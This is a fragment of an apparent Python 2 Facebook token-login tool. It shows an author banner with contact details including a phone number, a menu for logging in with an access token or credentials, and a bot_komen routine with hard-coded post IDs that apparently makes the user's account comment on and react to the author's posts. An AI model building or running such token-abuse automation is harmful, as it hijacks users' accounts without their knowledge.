...
\033[1;92mCoder   :\033[1;96mRana Nadeem Rajput
\033[1;92mGithub  :\033[1;96mhttps://github.com/Rananadeem5214
\033[1;92mFacebook:\033[1;96mmuhammad.nadeem5214
\033[1;92mYoutube :\033[1;96mTRIK MASTER BY RANA
\033[1;92mWhatsap :\033[1;96m03082503426
...
jalan('  \033[1;94m #+#    #+#   #+#     #+#     #+#    #+#    #+# #+#        #+#    #+#     ')
jalan('  \033[1;94m########### ###     ### ########### ########  ########## ###    ###      ')
jalan('                                contact me in fb Muhammad Nadeem 🔒     ')

def masuk():
    os.system('clear')
    print logo
    print '\033[1;95m[Rana] 1 Login Token Facebook'
    print '\033[1;95m[Rana] 2 Login With Facebook'
    print '\x1b[1;91m[Rana] 0 Exit'
    pilih_masuk()
...
def bot_komen():
    ...
    una = '100013185071041'
    kom = 'I Use RanaBrand \xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '937777953338365'
    post2 = '938954086554085'
    kom2 = 'Great RanaBrand \xf0\x9f\x98\x81'
    reac2 = 'Brand'
...
def pilih_bangla():
    ...
    if teak == '':
        ...
        print '033[1;94m[Rana] Stop Process Press CTRL then Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
    ...
    print '033[0;32m Commands By Rana Nadeem Rajput'
